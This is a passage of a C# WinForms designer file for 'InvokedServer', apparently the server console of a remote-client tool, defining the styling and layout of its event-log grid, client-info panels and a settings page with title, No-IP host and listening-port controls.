            this.EventLogDataGridView.ThemeStyle.HeaderStyle.BorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            this.EventLogDataGridView.ThemeStyle.HeaderStyle.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.EventLogDataGridView.ThemeStyle.HeaderStyle.ForeColor = System.Drawing.Color.White;
            this.EventLogDataGridView.ThemeStyle.HeaderStyle.HeaightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
            this.EventLogDataGridView.ThemeStyle.HeaderStyle.Height = 20;
            this.EventLogDataGridView.ThemeStyle.ReadOnly = true;
            this.EventLogDataGridView.ThemeStyle.RowsStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.EventLogDataGridView.ThemeStyle.RowsStyle.BorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None;
            this.EventLogDataGridView.ThemeStyle.RowsStyle.Font = new System.Drawing.Font("Lucida Console", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.EventLogDataGridView.ThemeStyle.RowsStyle.ForeColor = System.Drawing.Color.White;
            this.EventLogDataGridView.ThemeStyle.RowsStyle.Height = 22;
            this.EventLogDataGridView.ThemeStyle.RowsStyle.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(231)))), ((int)(((byte)(229)))), ((int)(((byte)(255)))));
            this.EventLogDataGridView.ThemeStyle.RowsStyle.SelectionForeColor = System.Drawing.Color.White;
            this.EventLogDataGridView.CellPainting += new System.Windows.Forms.DataGridViewCellPaintingEventHandler(this.EventLogDataGridView_CellPainting);
            this.EventLogDataGridView.MouseDown += new System.Windows.Forms.MouseEventHandler(this.EventsLogDataGridView_onMouseDown);
            // 
            // LogData
            // 
            this.LogData.HeaderText = "Event Log";
            this.LogData.Name = "LogData";
            this.LogData.ReadOnly = true;
            // 
            // EventLogsContextMenuStrip
            // 
            this.EventLogsContextMenuStrip.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.EventLogsContextMenuStrip.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.EventLogsContextMenuStrip.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.removeLogtoolStripMenuItem,
            this.removeAllLogstoolStripMenuItem});
            this.EventLogsContextMenuStrip.Name = "ClientContextMenuStrip";
            this.EventLogsContextMenuStrip.RenderStyle.ArrowColor = System.Drawing.Color.FromArgb(((int)(((byte)(151)))), ((int)(((byte)(143)))), ((int)(((byte)(255)))));
            this.EventLogsContextMenuStrip.RenderStyle.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(151)))), ((int)(((byte)(143)))), ((int)(((byte)(255)))));
            this.EventLogsContextMenuStrip.RenderStyle.ColorTable = null;
            this.EventLogsContextMenuStrip.RenderStyle.RoundedEdges = true;
            this.EventLogsContextMenuStrip.RenderStyle.SelectionArrowColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.EventLogsContextMenuStrip.RenderStyle.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(100)))), ((int)(((byte)(88)))), ((int)(((byte)(255)))));
            this.EventLogsContextMenuStrip.RenderStyle.SelectionForeColor = System.Drawing.SystemColors.Control;
            this.EventLogsContextMenuStrip.RenderStyle.SeparatorColor = System.Drawing.Color.FromArgb(((int)(((byte)(151)))), ((int)(((byte)(143)))), ((int)(((byte)(255)))));
            this.EventLogsContextMenuStrip.RenderStyle.TextRenderingHint = System.Drawing.Text.TextRenderingHint.SystemDefault;
            this.EventLogsContextMenuStrip.Size = new System.Drawing.Size(142, 48);
            // 
            // removeLogtoolStripMenuItem
            // 
            this.removeLogtoolStripMenuItem.ForeColor = System.Drawing.Color.White;
            this.removeLogtoolStripMenuItem.Image = global::InvokedServer.Properties.Resources.cross;
            this.removeLogtoolStripMenuItem.Name = "removeLogtoolStripMenuItem";
            this.removeLogtoolStripMenuItem.Size = new System.Drawing.Size(141, 22);
            this.removeLogtoolStripMenuItem.Text = "Remove log";
            this.removeLogtoolStripMenuItem.Click += new System.EventHandler(this.removeLogtoolStripMenuItem_Click);
            // 
            // removeAllLogstoolStripMenuItem
            // 
            this.removeAllLogstoolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control;
            this.removeAllLogstoolStripMenuItem.Image = global::InvokedServer.Properties.Resources.note;
            this.removeAllLogstoolStripMenuItem.Name = "removeAllLogstoolStripMenuItem";
            this.removeAllLogstoolStripMenuItem.Size = new System.Drawing.Size(141, 22);
            this.removeAllLogstoolStripMenuItem.Text = "Clear all logs";
            this.removeAllLogstoolStripMenuItem.Click += new System.EventHandler(this.removeAllLogstoolStripMenuItem_Click);
            // 
            // EventLogTopPanel
            // 
            this.EventLogTopPanel.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.EventLogTopPanel.Controls.Add(this.ToggleLogViewBtn);
            this.EventLogTopPanel.Controls.Add(this.EventLogLabel);
            this.EventLogTopPanel.Dock = System.Windows.Forms.DockStyle.Bottom;
            this.EventLogTopPanel.Location = new System.Drawing.Point(200, 220);
            this.EventLogTopPanel.Name = "EventLogTopPanel";
            this.EventLogTopPanel.Size = new System.Drawing.Size(679, 20);
            this.EventLogTopPanel.TabIndex = 8;
            // 
            // ToggleLogViewBtn
            // 
            this.ToggleLogViewBtn.BackColor = System.Drawing.Color.Transparent;
            this.ToggleLogViewBtn.BackgroundImage = global::InvokedServer.Properties.Resources.arrow_down;
            this.ToggleLogViewBtn.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Center;
            this.ToggleLogViewBtn.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.ToggleLogViewBtn.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.ToggleLogViewBtn.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.ToggleLogViewBtn.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.ToggleLogViewBtn.FillColor = System.Drawing.Color.Transparent;
            this.ToggleLogViewBtn.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.ToggleLogViewBtn.ForeColor = System.Drawing.Color.White;
            this.ToggleLogViewBtn.Location = new System.Drawing.Point(66, 3);
            this.ToggleLogViewBtn.Name = "ToggleLogViewBtn";
            this.ToggleLogViewBtn.Size = new System.Drawing.Size(16, 16);
            this.ToggleLogViewBtn.TabIndex = 10;
            this.ToggleLogViewBtn.Click += new System.EventHandler(this.ToggleLogViewBtn_Click);
            // 
            // EventLogLabel
            // 
            this.EventLogLabel.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.EventLogLabel.Location = new System.Drawing.Point(-1, 6);
            this.EventLogLabel.Name = "EventLogLabel";
            this.EventLogLabel.Size = new System.Drawing.Size(68, 16);
            this.EventLogLabel.TabIndex = 0;
            this.EventLogLabel.Text = "Event Log";
            this.EventLogLabel.TextAlign = System.Drawing.ContentAlignment.TopCenter;
            // 
            // clientInfoPanel
            // 
            this.clientInfoPanel.Controls.Add(this.clientNetworkInfoListView);
            this.clientInfoPanel.Controls.Add(this.clientDetailedInfoListView);
            this.clientInfoPanel.Controls.Add(this.clientInfoCountryListView);
            this.clientInfoPanel.Controls.Add(this.clientInfoPictureBox);
            this.clientInfoPanel.Dock = System.Windows.Forms.DockStyle.Left;
            this.clientInfoPanel.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.clientInfoPanel.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.clientInfoPanel.FillColor3 = System.Drawing.Color.Empty;
            this.clientInfoPanel.FillColor4 = System.Drawing.Color.Empty;
            this.clientInfoPanel.Location = new System.Drawing.Point(0, 0);
            this.clientInfoPanel.Name = "clientInfoPanel";
            this.clientInfoPanel.Size = new System.Drawing.Size(200, 396);
            this.clientInfoPanel.TabIndex = 9;
            this.clientInfoPanel.Visible = false;
            // 
            // clientNetworkInfoListView
            // 
            this.clientNetworkInfoListView.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.clientNetworkInfoListView.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.clientNetworkInfoListView.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
            this.columnHeader8,
            this.columnHeader9});
            this.clientNetworkInfoListView.ForeColor = System.Drawing.Color.White;
            this.clientNetworkInfoListView.FullRowSelect = true;
            this.clientNetworkInfoListView.HeaderStyle = System.Windows.Forms.ColumnHeaderStyle.None;
            this.clientNetworkInfoListView.HideSelection = false;
            this.clientNetworkInfoListView.Location = new System.Drawing.Point(6, 123);
            listViewColumnSorter1.NeedNumberCompare = false;
            listViewColumnSorter1.Order = System.Windows.Forms.SortOrder.None;
            listViewColumnSorter1.SortColumn = 0;
            this.clientNetworkInfoListView.LvwColumnSorter = listViewColumnSorter1;
            this.clientNetworkInfoListView.Name = "clientNetworkInfoListView";
            this.clientNetworkInfoListView.Scrollable = false;
            this.clientNetworkInfoListView.Size = new System.Drawing.Size(190, 92);
            this.clientNetworkInfoListView.SmallImageList = this.imageTabs;
            this.clientNetworkInfoListView.TabIndex = 3;
            this.clientNetworkInfoListView.UseCompatibleStateImageBehavior = false;
            this.clientNetworkInfoListView.View = System.Windows.Forms.View.Details;
            this.clientNetworkInfoListView.KeyDown += new System.Windows.Forms.KeyEventHandler(this.clientNetworkInfoListView_ItemClicked);
            // 
            // columnHeader8
            // 
            this.columnHeader8.Width = 90;
            // 
            // columnHeader9
            // 
            this.columnHeader9.Width = 150;
            // 
            // clientDetailedInfoListView
            // 
            this.clientDetailedInfoListView.AutoArrange = false;
            this.clientDetailedInfoListView.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.clientDetailedInfoListView.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.clientDetailedInfoListView.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
            this.columnHeader6,
            this.columnHeader7});
            this.clientDetailedInfoListView.ForeColor = System.Drawing.Color.White;
            this.clientDetailedInfoListView.FullRowSelect = true;
            this.clientDetailedInfoListView.HeaderStyle = System.Windows.Forms.ColumnHeaderStyle.None;
            this.clientDetailedInfoListView.HideSelection = false;
            this.clientDetailedInfoListView.Location = new System.Drawing.Point(6, 221);
            listViewColumnSorter2.NeedNumberCompare = false;
            listViewColumnSorter2.Order = System.Windows.Forms.SortOrder.None;
            listViewColumnSorter2.SortColumn = 0;
            this.clientDetailedInfoListView.LvwColumnSorter = listViewColumnSorter2;
            this.clientDetailedInfoListView.Name = "clientDetailedInfoListView";
            this.clientDetailedInfoListView.Scrollable = false;
            this.clientDetailedInfoListView.ShowGroups = false;
            this.clientDetailedInfoListView.ShowItemToolTips = true;
            this.clientDetailedInfoListView.Size = new System.Drawing.Size(190, 159);
            this.clientDetailedInfoListView.SmallImageList = this.imageTabs;
            this.clientDetailedInfoListView.TabIndex = 2;
            this.clientDetailedInfoListView.UseCompatibleStateImageBehavior = false;
            this.clientDetailedInfoListView.View = System.Windows.Forms.View.Details;
            this.clientDetailedInfoListView.KeyDown += new System.Windows.Forms.KeyEventHandler(this.clientDetailedInfoListView_ItemClicked);
            // 
            // columnHeader7
            // 
            this.columnHeader7.Width = 150;
            // 
            // clientInfoCountryListView
            // 
            this.clientInfoCountryListView.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.clientInfoCountryListView.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.clientInfoCountryListView.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
            this.columnHeader10,
            this.columnHeader11});
            this.clientInfoCountryListView.ForeColor = System.Drawing.Color.White;
            this.clientInfoCountryListView.FullRowSelect = true;
            this.clientInfoCountryListView.HeaderStyle = System.Windows.Forms.ColumnHeaderStyle.None;
            this.clientInfoCountryListView.HideSelection = false;
            this.clientInfoCountryListView.Location = new System.Drawing.Point(6, 103);
            listViewColumnSorter3.NeedNumberCompare = false;
            listViewColumnSorter3.Order = System.Windows.Forms.SortOrder.None;
            listViewColumnSorter3.SortColumn = 0;
            this.clientInfoCountryListView.LvwColumnSorter = listViewColumnSorter3;
            this.clientInfoCountryListView.Name = "clientInfoCountryListView";
            this.clientInfoCountryListView.Scrollable = false;
            this.clientInfoCountryListView.Size = new System.Drawing.Size(190, 23);
            this.clientInfoCountryListView.SmallImageList = this.imgFlags;
            this.clientInfoCountryListView.TabIndex = 1;
            this.clientInfoCountryListView.UseCompatibleStateImageBehavior = false;
            this.clientInfoCountryListView.View = System.Windows.Forms.View.Details;
            this.clientInfoCountryListView.KeyDown += new System.Windows.Forms.KeyEventHandler(this.clientInfoCountryListView_ItemClicked);
            // 
            // columnHeader10
            // 
            this.columnHeader10.Width = 90;
            // 
            // columnHeader11
            // 
            this.columnHeader11.Width = 150;
            // 
            // clientInfoPictureBox
            // 
            this.clientInfoPictureBox.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.clientInfoPictureBox.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Center;
            this.clientInfoPictureBox.Image = global::InvokedServer.Properties.Resources.LoadingV2;
            this.clientInfoPictureBox.ImageRotate = 0F;
            this.clientInfoPictureBox.Location = new System.Drawing.Point(6, 3);
            this.clientInfoPictureBox.Name = "clientInfoPictureBox";
            this.clientInfoPictureBox.Size = new System.Drawing.Size(190, 100);
            this.clientInfoPictureBox.SizeMode = System.Windows.Forms.PictureBoxSizeMode.CenterImage;
            this.clientInfoPictureBox.TabIndex = 0;
            this.clientInfoPictureBox.TabStop = false;
            // 
            // ServerPage
            // 
            this.ServerPage.AutoHiddenSlideSize = new System.Drawing.Size(200, 200);
            this.ServerPage.Controls.Add(this.guna2GroupBox2);
            this.ServerPage.Controls.Add(this.guna2GroupBox1);
            this.ServerPage.Flags = 65534;
            this.ServerPage.ImageSmall = global::InvokedServer.Properties.Resources.cog;
            this.ServerPage.LastVisibleSet = true;
            this.ServerPage.MinimumSize = new System.Drawing.Size(50, 50);
            this.ServerPage.Name = "ServerPage";
            this.ServerPage.Size = new System.Drawing.Size(879, 396);
            this.ServerPage.StateCommon.Page.Color1 = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.ServerPage.Text = "Settings";
            this.ServerPage.ToolTipTitle = "Page ToolTip";
            this.ServerPage.UniqueName = "5F3A8E63C1AE46FEC390B9463FAF1722";
            // 
            // guna2GroupBox2
            // 
            this.guna2GroupBox2.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Left)));
            this.guna2GroupBox2.BackColor = System.Drawing.Color.Transparent;
            this.guna2GroupBox2.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.guna2GroupBox2.BorderRadius = 2;
            this.guna2GroupBox2.Controls.Add(this.WindowTitletextBox);
            this.guna2GroupBox2.Controls.Add(this.TitleLabel);
            this.guna2GroupBox2.Controls.Add(this.SaveCustomTitleButton);
            this.guna2GroupBox2.Controls.Add(this.SetTitleBtn);
            this.guna2GroupBox2.Controls.Add(this.restoreOgTitleBtn);
            this.guna2GroupBox2.Controls.Add(this.AnimateTitleBtn);
            this.guna2GroupBox2.CustomBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.guna2GroupBox2.CustomBorderThickness = new System.Windows.Forms.Padding(0, 25, 0, 0);
            this.guna2GroupBox2.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.guna2GroupBox2.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.guna2GroupBox2.ForeColor = System.Drawing.Color.WhiteSmoke;
            this.guna2GroupBox2.Location = new System.Drawing.Point(313, 8);
            this.guna2GroupBox2.Name = "guna2GroupBox2";
            this.guna2GroupBox2.Size = new System.Drawing.Size(300, 200);
            this.guna2GroupBox2.TabIndex = 60;
            this.guna2GroupBox2.Text = "Aesthetics";
            this.guna2GroupBox2.TextOffset = new System.Drawing.Point(0, -7);
            this.guna2GroupBox2.UseTransparentBackground = true;
            // 
            // WindowTitletextBox
            // 
            this.WindowTitletextBox.Animated = true;
            this.WindowTitletextBox.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.WindowTitletextBox.BorderRadius = 2;
            this.WindowTitletextBox.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.WindowTitletextBox.DefaultText = "";
            this.WindowTitletextBox.DisabledState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(208)))), ((int)(((byte)(208)))), ((int)(((byte)(208)))));
            this.WindowTitletextBox.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(226)))), ((int)(((byte)(226)))), ((int)(((byte)(226)))));
            this.WindowTitletextBox.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.WindowTitletextBox.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.WindowTitletextBox.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.WindowTitletextBox.FocusedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.WindowTitletextBox.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.WindowTitletextBox.ForeColor = System.Drawing.Color.White;
            this.WindowTitletextBox.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.WindowTitletextBox.Location = new System.Drawing.Point(9, 48);
            this.WindowTitletextBox.Name = "WindowTitletextBox";
            this.WindowTitletextBox.PlaceholderText = "[Enter Window Title]";
            this.WindowTitletextBox.SelectedText = "";
            this.WindowTitletextBox.Size = new System.Drawing.Size(282, 23);
            this.WindowTitletextBox.TabIndex = 34;
            // 
            // TitleLabel
            // 
            this.TitleLabel.AutoSize = true;
            this.TitleLabel.ForeColor = System.Drawing.SystemColors.Control;
            this.TitleLabel.Location = new System.Drawing.Point(8, 31);
            this.TitleLabel.Name = "TitleLabel";
            this.TitleLabel.Size = new System.Drawing.Size(77, 15);
            this.TitleLabel.TabIndex = 2;
            this.TitleLabel.Text = "Window Title";
            // 
            // SaveCustomTitleButton
            // 
            this.SaveCustomTitleButton.Animated = true;
            this.SaveCustomTitleButton.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.SaveCustomTitleButton.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(72)))), ((int)(((byte)(82)))), ((int)(((byte)(98)))));
            this.SaveCustomTitleButton.BorderRadius = 2;
            this.SaveCustomTitleButton.BorderThickness = 1;
            this.SaveCustomTitleButton.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.SaveCustomTitleButton.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.SaveCustomTitleButton.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.SaveCustomTitleButton.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.SaveCustomTitleButton.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.SaveCustomTitleButton.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.SaveCustomTitleButton.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.SaveCustomTitleButton.Font = new System.Drawing.Font("Segoe UI", 8.25F);
            this.SaveCustomTitleButton.ForeColor = System.Drawing.Color.White;
            this.SaveCustomTitleButton.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.ForwardDiagonal;
            this.SaveCustomTitleButton.Image = global::InvokedServer.Properties.Resources.save;
            this.SaveCustomTitleButton.ImageSize = new System.Drawing.Size(16, 16);
            this.SaveCustomTitleButton.Location = new System.Drawing.Point(9, 164);
            this.SaveCustomTitleButton.Name = "SaveCustomTitleButton";
            this.SaveCustomTitleButton.Size = new System.Drawing.Size(282, 23);
            this.SaveCustomTitleButton.TabIndex = 38;
            this.SaveCustomTitleButton.Text = "Save";
            // 
            // SetTitleBtn
            // 
            this.SetTitleBtn.Animated = true;
            this.SetTitleBtn.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.SetTitleBtn.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(72)))), ((int)(((byte)(82)))), ((int)(((byte)(98)))));
            this.SetTitleBtn.BorderRadius = 2;
            this.SetTitleBtn.BorderThickness = 1;
            this.SetTitleBtn.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.SetTitleBtn.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.SetTitleBtn.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.SetTitleBtn.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.SetTitleBtn.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.SetTitleBtn.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.SetTitleBtn.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.SetTitleBtn.Font = new System.Drawing.Font("Segoe UI", 8.25F);
            this.SetTitleBtn.ForeColor = System.Drawing.Color.White;
            this.SetTitleBtn.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.ForwardDiagonal;
            this.SetTitleBtn.Image = global::InvokedServer.Properties.Resources.wrench_orange;
            this.SetTitleBtn.ImageSize = new System.Drawing.Size(16, 16);
            this.SetTitleBtn.Location = new System.Drawing.Point(9, 77);
            this.SetTitleBtn.Name = "SetTitleBtn";
            this.SetTitleBtn.Size = new System.Drawing.Size(282, 23);
            this.SetTitleBtn.TabIndex = 35;
            this.SetTitleBtn.Text = "Set";
            // 
            // restoreOgTitleBtn
            // 
            this.restoreOgTitleBtn.Animated = true;
            this.restoreOgTitleBtn.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.restoreOgTitleBtn.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(72)))), ((int)(((byte)(82)))), ((int)(((byte)(98)))));
            this.restoreOgTitleBtn.BorderRadius = 2;
            this.restoreOgTitleBtn.BorderThickness = 1;
            this.restoreOgTitleBtn.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.restoreOgTitleBtn.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.restoreOgTitleBtn.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.restoreOgTitleBtn.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.restoreOgTitleBtn.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.restoreOgTitleBtn.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.restoreOgTitleBtn.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.restoreOgTitleBtn.Font = new System.Drawing.Font("Segoe UI", 8.25F);
            this.restoreOgTitleBtn.ForeColor = System.Drawing.Color.White;
            this.restoreOgTitleBtn.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.ForwardDiagonal;
            this.restoreOgTitleBtn.Image = global::InvokedServer.Properties.Resources.refresh;
            this.restoreOgTitleBtn.ImageSize = new System.Drawing.Size(16, 16);
            this.restoreOgTitleBtn.Location = new System.Drawing.Point(9, 135);
            this.restoreOgTitleBtn.Name = "restoreOgTitleBtn";
            this.restoreOgTitleBtn.Size = new System.Drawing.Size(282, 23);
            this.restoreOgTitleBtn.TabIndex = 37;
            this.restoreOgTitleBtn.Text = "Restore OG Title";
            // 
            // AnimateTitleBtn
            // 
            this.AnimateTitleBtn.Animated = true;
            this.AnimateTitleBtn.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.AnimateTitleBtn.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(72)))), ((int)(((byte)(82)))), ((int)(((byte)(98)))));
            this.AnimateTitleBtn.BorderRadius = 2;
            this.AnimateTitleBtn.BorderThickness = 1;
            this.AnimateTitleBtn.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.AnimateTitleBtn.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.AnimateTitleBtn.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.AnimateTitleBtn.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.AnimateTitleBtn.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.AnimateTitleBtn.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.AnimateTitleBtn.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.AnimateTitleBtn.Font = new System.Drawing.Font("Segoe UI", 8.25F);
            this.AnimateTitleBtn.ForeColor = System.Drawing.Color.White;
            this.AnimateTitleBtn.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.ForwardDiagonal;
            this.AnimateTitleBtn.Image = global::InvokedServer.Properties.Resources.star;
            this.AnimateTitleBtn.ImageSize = new System.Drawing.Size(16, 16);
            this.AnimateTitleBtn.Location = new System.Drawing.Point(9, 106);
            this.AnimateTitleBtn.Name = "AnimateTitleBtn";
            this.AnimateTitleBtn.Size = new System.Drawing.Size(282, 23);
            this.AnimateTitleBtn.TabIndex = 36;
            this.AnimateTitleBtn.Text = "Animate Title";
            // 
            // guna2GroupBox1
            // 
            this.guna2GroupBox1.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Left)));
            this.guna2GroupBox1.BackColor = System.Drawing.Color.Transparent;
            this.guna2GroupBox1.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.guna2GroupBox1.BorderRadius = 2;
            this.guna2GroupBox1.Controls.Add(this.guna2HtmlLabel8);
            this.guna2GroupBox1.Controls.Add(this.chkShowPassword);
            this.guna2GroupBox1.Controls.Add(this.chkPopup);
            this.guna2GroupBox1.Controls.Add(this.guna2HtmlLabel7);
            this.guna2GroupBox1.Controls.Add(this.guna2GradientButton1);
            this.guna2GroupBox1.Controls.Add(this.guna2HtmlLabel1);
            this.guna2GroupBox1.Controls.Add(this.txtNoIPPass);
            this.guna2GroupBox1.Controls.Add(this.btnListen);
            this.guna2GroupBox1.Controls.Add(this.txtNoIPUser);
            this.guna2GroupBox1.Controls.Add(this.ncPort);
            this.guna2GroupBox1.Controls.Add(this.txtNoIPHost);
            this.guna2GroupBox1.Controls.Add(this.chkIPv6Support);
            this.guna2GroupBox1.Controls.Add(this.guna2HtmlLabel6);
            this.guna2GroupBox1.Controls.Add(this.guna2HtmlLabel2);
